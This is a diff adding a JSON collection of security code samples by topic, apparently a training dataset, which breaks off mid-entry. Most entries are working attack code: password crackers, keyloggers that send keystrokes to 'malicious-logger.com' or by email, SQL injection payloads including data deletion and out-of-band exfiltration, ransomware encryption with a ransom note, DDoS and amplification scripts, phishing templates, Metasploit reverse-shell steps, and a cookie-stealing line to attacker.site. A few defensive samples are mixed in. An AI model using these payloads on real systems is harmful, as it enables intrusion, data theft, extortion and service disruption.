@@ -1,0 +1,1181 @@
+[
+
+    {
+      "topic": "Brute Force Attack",
+      "code_samples": [
+        {
+          "description": "Simple brute force password cracker",
+          "code": "import itertools\n\npassword = 'target_password'\ncharset = 'abcdefghijklmnopqrstuvwxyz1234567890'\n\nfor length in range(1, 9):\n\tfor attempt in itertools.product(charset, repeat=length):\n\t\tattempt = ''.join(attempt)\n\t\tif attempt == password:\n\t\t    print('Password found:', attempt)\n\t\t    break"
+        },
+        {
+          "description": "Brute force attack on a hashed password",
+          "code": "import hashlib\nimport itertools\n\nhashed_password = hashlib.md5('target_password'.encode()).hexdigest()\ncharset = 'abcdefghijklmnopqrstuvwxyz1234567890'\n\nfor length in range(1, 9):\n\tfor attempt in itertools.product(charset, repeat=length):\n\t\tattempt = ''.join(attempt)\n\t\tif hashlib.md5(attempt.encode()).hexdigest() == hashed_password:\n\t\t    print('Password found:', attempt)\n\t\t    break"
+        },
+      
+        {
+            "description": "basic brute force password attack",
+            "code": "# Python pseudocode for a basic brute force password attack\nimport itertools\nimport string\n\ndef brute_force_attack(password_length):\n\tcharacters = string.ascii_lowercase + string.digits\n\tattempts = 0\n\tfor password in itertools.product(characters, repeat=password_length):\n\t\tattempts += 1\n\t\tpassword = ''.join(password)\n\t\tif password == 'target_password':\n\t\t    return f'Password found: {password}, after {attempts} attempts'\n\treturn 'Password not found'"
+        },
+        {
+            "description": "dictionary attack",
+            "code": "# Python pseudocode for a dictionary attack\ndef dictionary_attack(dictionary_file, target_hash):\n\twith open(dictionary_file, 'r') as file:\n\t\tfor word in file:\n\t\t    if hash_function(word.strip()) == target_hash:\n\t\t        return f'Password found: {word.strip()}'\n\treturn 'Password not found'"
+        },
+        {
+            "description": "hybrid brute force attack",
+            "code": "# Python pseudocode for a hybrid brute force attack combining dictionary words with extra characters\ndef hybrid_brute_force_attack(dictionary_file, extra_characters, target_hash):\n\twith open(dictionary_file, 'r') as file:\n\t\tfor word in file:\n\t\t    for extra in extra_characters:\n\t\t        combined_word = word.strip() + extra\n\t\t        if hash_function(combined_word) == target_hash:\n\t\t            return f'Password found: {combined_word}'\n\treturn 'Password not found'"
+        },
+        {
+            "description": "reverse brute force attack",
+            "code": "# Python pseudocode for a reverse brute force attack where the attacker has a password and is looking for matching usernames\ndef reverse_brute_force_attack(password, username_list):\n\tfor username in username_list:\n\t\tif login(username, password):\n\t\t    return f'Username found: {username}'\n\treturn 'Username not found'"
+        },
+        {
+            "description": "credential stuffing",
+            "code": "# Python pseudocode for credential stuffing where known username-password pairs are tested against different websites\ndef credential_stuffing(credentials_list, website_login_function):\n\tfor username, password in credentials_list:\n\t\tif website_login_function(username, password):\n\t\t    return f'Credentials valid for: {username}'\n\treturn 'No valid credentials found'"
+        }
+      
+      ]
+    },
+    {
+      "topic": "Keyloggers",
+      "code_samples": [
+        {
+          "description": "Basic keylogger that logs keystrokes to a file",
+          "code": "from pynput.keyboard import Listener\n\nlog_file = 'keylog.txt'\ndef on_press(key):\n\twith open(log_file, 'a') as f:\n\t\tf.write(f'{key} ')\n\nwith Listener(on_press=on_press) as listener:\n\tlistener.join()"
+        },
+        {
+          "description": "Keylogger with email sending functionality",
+          "code": "from pynput.keyboard import Listener\nimport smtplib\n\nlog = ''\ndef on_press(key):\n\tglobal log\n\tlog += str(key)\n\tif len(log) > 100:\n\t\tsend_email(log)\n\t\tlog = ''\n\ndef send_email(log):\n\t# Email sending logic here\n\tpass\n\nwith Listener(on_press=on_press) as listener:\n\tlistener.join()"
+        },
+        {
+          "description":"javascript keylogger",
+          "code":"document.addEventListener('keypress', function(e) {\t\nvar xhr = new XMLHttpRequest();\t\nxhr.open('POST', 'http://malicious-logger.com', true);\t\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n\txhr.send('key=' + e.key);\n});"
+        },
+        {
+          "description":"hardware keylogger detection",
+          "code":"devices = get_connected_devices()\nfor device in devices:\t\nif device.type == 'USB' and device.class == 'HID' and 'keyboard' not in device.description:    \t\nalert('Potential hardware keylogger detected: ' + device.id)"
+        },
+        {
+          "description":"keylogger mitigation techniques",
+          "code":"def check_for_keyloggers(process_list):\n\tfor process in process_list:\n\t\tif process.name == 'suspicious_keylogger_process':\n\t\t    terminate_process(process.id)\nprocess_list = get_running_processes()\ncheck_for_keyloggers(process_list)"
+        },
+        {
+            "description": "email keylogger script",
+            "code": "import smtplib\nfrom pynput.keyboard import Key, Listener\n\nlog = \"\"\n\ndef on_press(key):\n\tglobal log\n\tlog += str(key)\n\ndef send_email(log):\n\tserver = smtplib.SMTP('smtp.gmail.com', 587)\n\tserver.starttls()\n\tserver.login('email@gmail.com', 'password')\n\tserver.sendmail('email@gmail.com', 'email@gmail.com', log)\n\tserver.quit()\n\nwith Listener(on_press=on_press) as listener:\n\tlistener.join()\n\tsend_email(log)"
+        },
+        {
+            "description": "usb keylogger",
+            "code": "class USBKeylogger:\n\tdef __init__(self, device):\n\t\tself.device = device\n\t\tself.log = \"\"\n\n\tdef start(self):\n\t\twhile True:\n\t\t    input = self.device.read_input()\n\t\t    self.log += input\n\t\t    if len(self.log) > 100:\n\t\t        self.send_log()"
+        }
+      ]
+    },
+    {
+        "topic": "SQL Injection",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to SQL Injection",
+            "code": "import sqlite3\n\ndef unsafe_query(db_file, user_input):\n\tconn = sqlite3.connect(db_file)\n\tcursor = conn.cursor()\n\tquery = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n\tcursor.execute(query)\n\treturn cursor.fetchall()"
+          },
+          {
+            "description": "Secure code using parameterized queries to prevent SQL Injection",
+            "code": "import sqlite3\n\ndef safe_query(db_file, user_input):\n\tconn = sqlite3.connect(db_file)\n\tcursor = conn.cursor()\n\tquery = \"SELECT * FROM users WHERE username = ?\"\n\tcursor.execute(query, (user_input,))\n\treturn cursor.fetchall()"
+          },
+
+          {
+              "description": "basic sql injection",
+              "code": "' OR '1'='1' --"
+          },
+          {
+              "description": "extracting data",
+              "code": "' UNION SELECT username, password FROM users --"
+          },
+          {
+              "description": "bypassing user authentication",
+              "code": "' OR '1'='1' UNION SELECT * FROM users WHERE '1'='1' --"
+          },
+          {
+              "description": "retrieving hidden data",
+              "code": "' UNION SELECT * FROM information_schema.tables; --"
+          },
+          {
+              "description": "modifying data",
+              "code": "'; UPDATE users SET password = 'pwned' WHERE username = 'admin'; --"
+          },
+          {
+              "description": "database discovery",
+              "code": "' UNION SELECT schema_name FROM information_schema.schemata; --"
+          },
+          {
+              "description": "deleting data",
+              "code": "'; DROP TABLE users; --"
+          },
+          {
+              "description": "altering database structure",
+              "code": "'; ALTER TABLE users ADD COLUMN hacker_proof INT; --"
+          },
+          {
+              "description": "using comments to truncate queries",
+              "code": "' OR '1'='1' /* rest of the query is ignored */; --"
+          },
+          {
+              "description": "time-based blind sql injection",
+              "code": "'; IF (1=1) WAITFOR DELAY '00:00:05'; --"
+          },
+          {
+              "description": "error-based sql injection",
+              "code": "' AND 1=(SELECT COUNT(*) FROM tablenames); --"
+          },
+          {
+              "description": "second order sql injection",
+              "code": "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --"
+          },
+          {
+              "description": "inferential blind sql injection",
+              "code": "' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0; --"
+          },
+          {
+              "description": "out-of-band data exfiltration",
+              "code": "'; EXEC xp_cmdshell('nslookup www.malicious.com'); --"
+          },
+          {
+              "description": "bypassing filters using encoded characters",
+              "code": "'%20or%20'1'='1'; --"
+          },
+          {
+              "description": "automated exploitation using sqlmap",
+              "code": "sqlmap -u \"http://www.example.com/vuln.php?id=1\" --batch"
+          },
+          {
+              "description": "dumping database contents",
+              "code": "' UNION SELECT * FROM information_schema.tables; --"
+          },
+          {
+              "description": "accessing hidden columns",
+              "code": "' UNION SELECT NULL, username, password FROM users; --"
+          },
+          {
+              "description": "bypassing login with administrative rights",
+              "code": "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%'); --"
+          },
+          {
+              "description": "injecting into insert statements",
+              "code": "INSERT INTO logs (message) VALUES ('User login: '' || (SELECT username FROM users WHERE username = 'admin') || ''');"
+          },
+          {
+            "description": "Basic Usage: Scan a single URL for SQL injection vulnerabilities.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\""
+          },
+          {
+            "description": "POST Request: Test a POST request for SQL injection.",
+            "code": "sqlmap -u \"http://example.com/login.php\" --data=\"username=test&password=test\" --method=POST"
+          },
+          {
+            "description": "Cookie-based Attack: Test for SQL injection using cookies.",
+            "code": "sqlmap -u \"http://example.com/\" --cookie=\"PHPSESSID=abc123\""
+          },
+          {
+            "description": "Specify Parameter: Test a specific parameter for SQL injection.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" --data=\"id=1\""
+          },
+          {
+            "description": "Batch Mode: Run multiple tests specified in a text file.",
+            "code": "sqlmap -m targets.txt"
+          },
+          {
+            "description": "Database Enumeration: Enumerate databases on the target server.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" --dbs"
+          },
+          {
+            "description": "Table Enumeration: Enumerate tables in a specific database.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name --tables"
+          },
+          {
+            "description": "Dump Data: Dump data from a specific table.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" -D database_name -T table_name --dump"
+          },
+          {
+            "description": "Fingerprint Database: Determine the type and version of the database.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" --banner"
+          },
+          {
+            "description": "Use Tor: Route requests through the Tor network for anonymity.",
+            "code": "sqlmap -u \"http://example.com/page.php?id=1\" --tor"
+          }
+
+                
+        ]
+      },
+      {
+        "topic": "Ransomware",
+        "code_samples": [
+          {
+            "description": "Encrypt files with AES encryption",
+            "code": "from Crypto.Cipher import AES\nimport os\n\nBLOCK_SIZE = 16\n\n# Pad the data to be encrypted\ndef pad(data):\n\treturn data + (BLOCK_SIZE - len(data) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(data) % BLOCK_SIZE)\n\n# Encrypt the data\ndef encrypt_file(file_path, key):\n\twith open(file_path, 'rb') as file:\n\t\tdata = file.read()\n\tcipher = AES.new(key, AES.MODE_ECB)\n\tencrypted_data = cipher.encrypt(pad(data))\n\twith open(file_path + '.encrypted', 'wb') as file:\n\t\tfile.write(encrypted_data)\n\n# Decrypt the data\ndef decrypt_file(file_path, key):\n\twith open(file_path, 'rb') as file:\n\t\tencrypted_data = file.read()\n\tcipher = AES.new(key, AES.MODE_ECB)\n\tdecrypted_data = cipher.decrypt(encrypted_data)\n\twith open(os.path.splitext(file_path)[0], 'wb') as file:\n\t\tfile.write(decrypted_data)"
+          },
+          {
+            "description": "Generate unique encryption key",
+            "code": "from Crypto.Random import get_random_bytes\n\n# Generate a random key\ndef generate_key():\n\treturn get_random_bytes(16)"
+          },
+          {
+            "description": "Create ransom note",
+            "code": "def create_ransom_note(file_path):\n\twith open(file_path, 'w') as note:\n\t\tnote.write('Your files have been encrypted. Pay $1000 in Bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to get the decryption key.')"
+          },
+          {
+            "description": "Display ransom demand message",
+            "code": "def display_ransom_message():\n\tprint('Your files have been encrypted. Pay $1000 in Bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to get the decryption key.')"
+          },
+          {
+            "description": "Check payment status",
+            "code": "def check_payment_status(transaction_id):\n\t# Query the blockchain for the status of the transaction\n\tblockchain_response = query_blockchain(transaction_id)\n\tif blockchain_response['status'] == 'confirmed':\n\t\treturn True\n\telse:\n\t\treturn False\n\ndef query_blockchain(transaction_id):\n\t# Simulated function to query blockchain API\n\t# In real-world scenario, this would interact with the blockchain network\n\t# and return transaction details\n\treturn {'status': 'confirmed'}"
+          }
+        ]
+      },      
+      {
+        "topic": "DDoS Attacks",
+        "code_samples": [
+          {
+            "description": "DDos attack using HTTP requests",
+            "code": "import requests\n\ndef ddos_attack(target_url):\n\twhile True:\n\t\tresponse = requests.get(target_url)\n\t\tprint(f'Status Code: {response.status_code}')"
+          },
+          {
+            "description": "network layer DDos attack using ICMP packets",
+            "code": "from scapy.all import *\n\ndef ddos_attack(target_ip):\n\twhile True:\n\t\tsend(IP(dst=target_ip)/ICMP())"
+          },
+          {
+              "description": "connect attack",
+              "code": "# Python pseudocode for a Connect attack\nimport socket\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\n\nsockets = []\nfor _ in range(10000):\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((target_ip, target_port))\n\tsockets.append(s)"
+          },
+          {
+              "description": "closing attack",
+              "code": "# Python pseudocode for a Closing attack\nimport socket\nimport time\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\n\nsockets = []\nfor _ in range(10000):\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((target_ip, target_port))\n\ts.shutdown(socket.SHUT_WR)\n\ttime.sleep(0.1)\n\tsockets.append(s)"
+          },
+          {
+              "description": "slowloris attack",
+              "code": "# Python pseudocode for a Slowloris attack\nimport socket\nimport time\n\ntarget_ip = '192.168.1.1'\ntarget_port = 80\nconnection_count = 1000\n\nsockets = []\nfor _ in range(connection_count):\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((target_ip, target_port))\n\ts.send('GET / HTTP/1.1\\r\\n'.encode('utf-8'))\n\tsockets.append(s)\n\nwhile True:\n\tfor s in sockets:\n\t\ttry:\n\t\t    s.send('X-a: b\\r\\n'.encode('utf-8'))\n\t\texcept socket.error:\n\t\t    sockets.remove(s)\n\ttime.sleep(15)"
+          }
+                
+        ]
+      },
+      {
+        "topic": "Phishing",
+        "code_samples":
+        [
+          {
+            "description": "phishing email template",
+            "code": "Dear user,\n\nWe have detected unusual activity on your account. Please click the link below to verify your identity:\n\n[Verify Your Account\n\nBest regards,\nYour Trusted Bank"
+          },
+          {
+            "description": "phishing website HTML code",
+            "code": "<html>\n  <head>\n\t<title>Your Trusted Bank</title>\n  </head>\n  <body>\n\t<h1>Account Verification Needed</h1>\n\t<p>Please enter your login details below:</p>\n\t<form action='#' method='post'>\n\t  <input type='text' name='username' placeholder='Username'>\n\t  <input type='password' name='password' placeholder='Password'>\n\t  <input type='submit' value='Verify'>\n\t</form>\n  </body>\n</html>"
+          }
+        ]
+      },
+      {
+        "topic": "Network Security",
+        "code_samples": [
+          {
+            "description": "network firewall rule in iptables",
+            "code": "iptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -j DROP"
+          },
+          {
+            "description": "Example of securing a network using SSH key authentication",
+            "code": "ssh-keygen -t rsa -b 4096\nssh-copy-id user@remote_host"
+          }
+        ]
+      },
+      {
+        "topic": "Cryptography",
+        "code_samples": [
+          {
+            "description": "Example of encrypting data using AES in Python",
+            "code": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt_data(data):\n\tkey = os.urandom(16)\n\tcipher = AES.new(key, AES.MODE_EAX)\n\tnonce = cipher.nonce\n\tciphertext, tag = cipher.encrypt_and_digest(data.encode())\n\treturn nonce, ciphertext, tag"
+          },
+          {
+            "description": "Example of creating a digital signature using RSA",
+            "code": "from Crypto.PublicKey import RSA\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\n\nkey = RSA.generate(2048)\nprivate_key = key.export_key()\npublic_key = key.publickey().export_key()\n\nmessage = 'This is a secure message.'\nh = SHA256.new(message.encode())\nsignature = pkcs1_15.new(key).sign(h)"
+          }
+        ]
+      },
+      {
+        "topic": "Preventing Keyloggers",
+        "code_samples": [
+          {
+            "description": "Example of using a virtual keyboard to prevent keylogging",
+            "code": "from tkinter import *\n\nroot = Tk()\n\n# Function to simulate key press\ndef virtual_key_press(key):\n\tprint(f'Virtual key {key} pressed')\n\n# Create buttons for virtual keyboard\nfor key in 'abcdefghijklmnopqrstuvwxyz':\n\tButton(root, text=key, command=lambda k=key: virtual_key_press(k)).pack()\n\nroot.mainloop()"
+          },
+          {
+            "description": "Example of monitoring system for unauthorized keyboard hooks",
+            "code": "import os\nimport sys\n\n# Function to check for system hooks\ndef check_for_hooks():\n\thooks = os.popen('grep -i keyboard /proc/interrupts').read()\n\tif 'keyboard' in hooks.lower():\n\t\tprint('Potential keylogger detected!')\n\t\tsys.exit(1)\n\ncheck_for_hooks()"
+          }
+        ]
+      },
+      {
+        "topic": "Nmap",
+        "code_samples": [
+          {
+            "description": "Example of using Nmap to scan for open ports on a target host",
+            "code": "import nmap\n\n# Initialize Nmap Scanner\nnm = nmap.PortScanner()\n\n# Scan for open ports on target host\nnm.scan('192.168.1.1', '22-443')\n\n# Print scan results\nfor host in nm.all_hosts():\n\tprint(f'Host : {host} ({nm[host].hostname()})')\n\tprint(f'State : {nm[host].state()}')\n\tfor proto in nm[host].all_protocols():\n\t\tprint(f'----------\\nProtocol : {proto}')\n\n\t\tlport = nm[host][proto].keys()\n\t\tfor port in lport:\n\t\t    print(f'port : {port}\\tstate : {nm[host][proto][port]['state']}')"
+          },
+          {
+            "description": "Example of using Nmap to perform OS detection",
+            "code": "import nmap\n\n# Initialize Nmap Scanner\nnm = nmap.PortScanner()\n\n# Perform OS detection\nnm.scan('192.168.1.1', arguments='-O')\n\n# Print OS detection results\nif 'osclass' in nm['192.168.1.1']:\n\tfor osclass in nm['192.168.1.1']['osclass']:\n\t\tprint(f'OS Type: {osclass['type']}\\nOS Vendor: {osclass['vendor']}\\nOS Family: {osclass['osfamily']}\\nOS Generation: {osclass['osgen']}\\nAccuracy: {osclass['accuracy']}%')"
+          },
+          {
+            "description": "basic network scan",
+            "code": "nmap 192.168.1.1"
+          },
+          {
+            "description": "scan specific ports",
+            "code": "nmap -p 80,443 192.168.1.1"
+          },
+          {
+            "description": "scan a range of ports",
+            "code": "nmap -p 1-100 192.168.1.1"
+        },
+        {
+            "description": "aggressive scan",
+            "code": "nmap -A 192.168.1.1"
+        },
+        {
+            "description": "scan an entire subnet",
+            "code": "nmap 192.168.1.0/24"
+        },
+        {
+            "description": "os detection",
+            "code": "nmap -O 192.168.1.1"
+        },
+        {
+            "description": "service version detection",
+            "code": "nmap -sV 192.168.1.1"
+        },
+        {
+            "description": "tcp syn scan",
+            "code": "nmap -sS 192.168.1.1"
+        },
+        {
+            "description": "udp scan",
+            "code": "nmap -sU 192.168.1.1"
+        },
+        {
+            "description": "scan using a specific network interface",
+            "code": "nmap --interface eth0 192.168.1.1"
+        },
+        {
+            "description": "scan using a specific script",
+            "code": "nmap --script=http-title 192.168.1.1"
+        },
+        {
+            "description": "scan with a decoy",
+            "code": "nmap -D 192.168.1.2 192.168.1.1"
+        },
+        {
+            "description": "scan with a specific source port",
+            "code": "nmap --source-port 53 192.168.1.1"
+        },
+        {
+            "description": "scan with fragmented packets",
+            "code": "nmap -f 192.168.1.1"
+        },
+        {
+            "description": "perform a fast scan",
+            "code": "nmap -T4 192.168.1.1"
+        },
+        {
+            "description": "scan ipv6 addresses",
+            "code": "nmap -6 ipv6_address"
+        },
+        {
+            "description": "scan for vulnerabilities",
+            "code": "nmap --script=vuln 192.168.1.1"
+        },
+        {
+            "description": "scan and output to a file",
+            "code": "nmap -oN output.txt 192.168.1.1"
+        },
+        {
+            "description": "scan and save output in all formats",
+            "code": "nmap -oA output 192.168.1.1"
+        },
+        {
+            "description": "scan and exclude certain hosts",
+            "code": "nmap 192.168.1.1/24 --exclude 192.168.1.5"
+        }
+        ]
+      },
+      {
+        "topic": "Metasploit",
+        "code_samples": [
+          {
+            "description": "Basic Metasploit console start",
+            "code": "msfconsole"
+          },
+          {
+            "description": "Example of using an exploit module",
+            "code": "msfconsole\nuse exploit/windows/smb/ms08_067_netapi\nset RHOST 192.168.1.1\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100"
+          },
+          {
+            "description": "Set options for an exploit",
+            "code": "set RHOST 192.168.1.1\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100"
+          },
+          {
+            "description": "Run the exploit",
+            "code": "exploit"
+          },
+          {
+            "description": "Use a post-exploitation module",
+            "code": "use post/windows/gather/enum_applications"
+          },
+          {
+            "description": "Set session for post-exploitation module",
+            "code": "set SESSION 1"
+          },
+          {
+            "description": "Run the post-exploitation module",
+            "code": "run"
+          },
+          {
+            "description": "Search for a module",
+            "code": "search type:exploit platform:windows name:netapi"
+          },
+          {
+            "description": "Save output to a file",
+            "code": "spool /tmp/msf_output.txt"
+          },
+          {
+            "description": "List all exploits",
+            "code": "show exploits"
+          },
+          {
+            "description": "List all payloads",
+            "code": "show payloads"
+          },
+          {
+            "description": "Generate a payload",
+            "code": "generate -t exe -f /tmp/payload.exe"
+          },
+          {
+            "description": "Use an auxiliary module",
+            "code": "use auxiliary/scanner/smb/smb_version"
+          },
+          {
+            "description": "Set RHOSTS for auxiliary module",
+            "code": "set RHOSTS 192.168.1.0/24"
+          },
+          {
+            "description": "Run the auxiliary module",
+            "code": "run"
+          },
+          {
+            "description": "Background a session",
+            "code": "background"
+          },
+          {
+            "description": "List active sessions",
+            "code": "sessions"
+          },
+          {
+            "description": "Interact with a session",
+            "code": "sessions -i 1"
+          },
+          {
+            "description": "Upload a file to a session",
+            "code": "upload /tmp/file.txt C:\\Users\\Public\\"
+          },
+          {
+            "description": "Download a file from a session",
+            "code": "download C:\\Users\\Public\\file.txt /tmp/"
+          },
+          {
+            "description": "Run a meterpreter script",
+            "code": "run post/windows/manage/migrate"
+          }
+        ]
+      },      
+      {
+        "topic": "Buffer Overflow Attack",
+        "code_samples": [
+          {
+            "description": "buffer overflow vulnerability in C",
+            "code": "void vulnerable_function(char *str) {\n  char buffer[10];\n  strcpy(buffer, str);\n}\n\nint main() {\n  char large_string[256];\n  memset(large_string, 'A', 255);\n  large_string[255] = '\\0';\n  vulnerable_function(large_string);\n}"
+          }
+        ]
+      },
+      {
+        "topic": "CORS Vulnerabilities",
+        "code_samples": [
+          {
+            "description": "misconfigured CORS policy",
+            "code": "app.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*');\n  next();\n});"
+          }
+        ]
+      },
+      {
+        "topic": "Credential Stuffing",
+        "code_samples": [
+          {
+            "description": "login function vulnerable to credential stuffing",
+            "code": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // User authentication logic that doesn't implement rate limiting or account lockout\n});"
+          }
+        ]
+      },
+      {
+        "topic": "Blind SQL Injection",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to blind SQL injection",
+            "code": "SELECT * FROM users WHERE username = '$username' AND password = '$password'"
+          }
+        ]
+      },
+      {
+        "topic": "Buffer Overflow via Environment Variables",
+        "code_samples": [
+          {
+            "description": "Example of exploiting buffer overflow via environment variables in C",
+            "code": "char *env_var = getenv('VULNERABLE_VAR');\nchar buffer[100];\nstrcpy(buffer, env_var);"
+          }
+        ]
+      },
+      {
+        "topic": "Clickjacking",
+        "code_samples": [
+          {
+            "description": "web page vulnerable to clickjacking",
+            "code": "<iframe src='https://vulnerable.site/login' width='700' height='500'></iframe>"
+          }
+        ]
+      },
+      {
+        "topic": "Code Injection",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to injection",
+            "code": "eval(user_input)"
+          }
+        ]
+      },
+      {
+        "topic": "Cross Site Scripting (XSS)",
+        "code_samples": [
+          {
+            "description":"basic example of xss attack",
+            "code":"<script> alert('hello xss'); </script>"
+          },
+          {
+            "description": "Basic reflected XSS attack",
+            "code": "def reflected_xss_attack(request):\n\tuser_input = request.GET.get('input')\n\treturn '<html><body>' + user_input + '</body></html>'"
+          },
+          {
+            "description": "stored XSS attack in a comment system",
+            "code": "def store_comment(comment):\n\t# Store the comment in the database\n\tpass\n\ndef display_comments():\n\t# Retrieve comments from the database and display them\n\t# Vulnerable to stored XSS if comments are not properly sanitized\n\tpass"
+          },
+          {
+            "description": "basic csrf token implementation",
+            "code": "# Pseudocode for implementing CSRF tokens in a web form\n<form method=\"post\" action=\"/submit-form\">\n\t<input type=\"hidden\" name=\"csrf_token\" value=\"generated_csrf_token\">\n\t<!-- form fields -->\n\t<input type=\"submit\" value=\"Submit\">\n</form>"
+          },
+          {
+              "description": "csrf token validation",
+              "code": "# Pseudocode for validating CSRF tokens in server-side code\nif received_csrf_token == session_csrf_token:\n\tprocess_form_data()\nelse:\n\traise CSRFTokenValidationError('Invalid CSRF token')"
+          },
+          {
+              "description": "csrf protection with double submit cookie",
+              "code": "# Pseudocode for CSRF protection using the double submit cookie technique\nset_cookie('csrf_cookie', generated_csrf_token)\nif received_csrf_cookie == received_csrf_token:\n\tprocess_request()\nelse:\n\traise CSRFProtectionError('CSRF validation failed')"
+          },
+          {
+              "description": "csrf protection using custom headers",
+              "code": "# Pseudocode for CSRF protection by checking custom headers in AJAX requests\nif request.headers.get('X-Requested-With') == 'XMLHttpRequest':\n\tprocess_ajax_request()\nelse:\n\traise CSRFProtectionError('Missing custom header for AJAX request')"
+          },
+          {
+              "description": "csrf mitigation using same-site cookies",
+              "code": "# Pseudocode for setting SameSite attribute in cookies for CSRF mitigation\nset_cookie('session_cookie', session_id, SameSite='Strict')"
+          },
+          {
+              "description": "basic csrf token implementation",
+              "code": "# Pseudocode for implementing CSRF tokens in a web form\n<form method=\"post\" action=\"/submit-form\">\n\t<input type=\"hidden\" name=\"csrf_token\" value=\"generated_csrf_token\">\n\t<!-- form fields -->\n\t<input type=\"submit\" value=\"Submit\">\n</form>"
+          },
+          {
+              "description": "csrf token validation",
+              "code": "# Pseudocode for validating CSRF tokens in server-side code\nif received_csrf_token == session_csrf_token:\n\tprocess_form_data()\nelse:\n\traise CSRFTokenValidationError('Invalid CSRF token')"
+          },
+          {
+              "description": "csrf protection with double submit cookie",
+              "code": "# Pseudocode for CSRF protection using the double submit cookie technique\nset_cookie('csrf_cookie', generated_csrf_token)\nif received_csrf_cookie == received_csrf_token:\n\tprocess_request()\nelse:\n\traise CSRFProtectionError('CSRF validation failed')"
+          },
+          {
+              "description": "csrf protection using custom headers",
+              "code": "# Pseudocode for CSRF protection by checking custom headers in AJAX requests\nif request.headers.get('X-Requested-With') == 'XMLHttpRequest':\n\tprocess_ajax_request()\nelse:\n\traise CSRFProtectionError('Missing custom header for AJAX request')"
+          },
+          {
+              "description": "csrf mitigation using same-site cookies",
+              "code": "# Pseudocode for setting SameSite attribute in cookies for CSRF mitigation\nset_cookie('session_cookie', session_id, SameSite='Strict')"
+          }
+        ]
+      },
+      {
+        "topic": "Blind XPath Injection",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to blind XPath injection",
+            "code": "xmlDoc.SelectNodes('//user[name/text()=\"' + userInput + '\"]');"
+          }
+        ]
+      },
+      {
+        "topic": "Denial of Service",
+        "code_samples": [
+          {
+            "description": "simple DoS attack script",
+            "code": "import socket\n\nIP = 'target_ip'\nPORT = 80\nMESSAGE = 'Knock knock!'.encode()\n\nwhile True:\n  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  sock.connect((IP, PORT))\n  sock.send(MESSAGE)\n  sock.close()"
+          }
+        ]
+      },
+      {
+        "topic": "Session Hijacking",
+        "code_samples": [
+          {
+            "description": "Example of stealing session cookies",
+            "code": "document.location = 'http://attacker.site/steal?cookie=' + document.cookie;"
+          }
+        ]
+      },
+      {
+        "topic": "Cross-Site Request Forgery (CSRF)",
+        "code_samples": [
+          {
+            "description": "CSRF attack in an HTML form",
+            "code": "<form action='https://vulnerable.site/transfer' method='POST'>\n  <input type='hidden' name='amount' value='1000'>\n  <input type='hidden' name='account' value='attacker'>\n</form>\n<script>document.forms[0].submit();</script>"
+          }
+        ]
+      },
+      {
+        "topic": "LDAP Injection",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to LDAP injection",
+            "code": "String query = \"(&(uid=\" + userInput + \")(userPassword={0}))\";"
+          }
+        ]
+      },
+      {
+        "topic": "Man-in-the-Browser Attack",
+        "code_samples": [
+          {
+            "description": "Example of malicious script for Man-in-the-Browser attack",
+            "code": "if (window.location.hostname === 'bank.com') {\n  // Code to manipulate banking transactions\n}"
+          }
+        ]
+      },
+      {
+        "topic": "Password Spraying Attack",
+        "code_samples": [
+          {
+            "description": "password spraying attack script",
+            "code": "import requests\n\nusernames = ['user1', 'user2', 'user3']\npassword = 'commonPassword'\n\nfor username in usernames:\n  response = requests.post('https://vulnerable.site/login', data={'username': username, 'password': password})\n  if response.status_code == 200:\n\tprint(f'Successful login for: {username}')"
+          }
+        ]
+      },
+      {
+        "topic": "Path Traversal",
+        "code_samples": [
+          {
+            "description": "Example of code vulnerable to path traversal",
+            "code": "file_path = request.GET.get('file')\nwith open(file_path, 'r') as file:\n  data = file.read()"
+          }
+        ]
+      },
+      {
+        "topic": "Reflected DOM Injection",
+        "code_samples": [
+          {
+            "description": "Example of reflected DOM injection",
+            "code": "document.getElementById('output').innerHTML = location.hash.substring(1);"
+          }
+        ]
+      },
+      {
+        "topic": "IP Spoofing",
+        "code_samples": [
+          {
+            "description": "Example of IP spoofing using Scapy in Python",
+            "code": "from scapy.all import *\n\npacket = IP(src='fake_ip', dst='target_ip') / ICMP()\nsend(packet)"
+          }
+        ]
+      },
+      {
+        "topic": "Web Service Amplification Attack",
+        "code_samples": [
+          {
+            "description": "amplification attack using DNS reflection",
+            "code": "from scapy.all import *\n\npacket = IP(dst='target_ip', src='victim_ip') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='example.com', qtype='ANY'))\nsend(packet)"
+          }
+        ]
+      },
+      {
+        "topic": "Cross-Site Tracing (XST)",
+        "code_samples": [
+          {
+            "description": "XST attack",
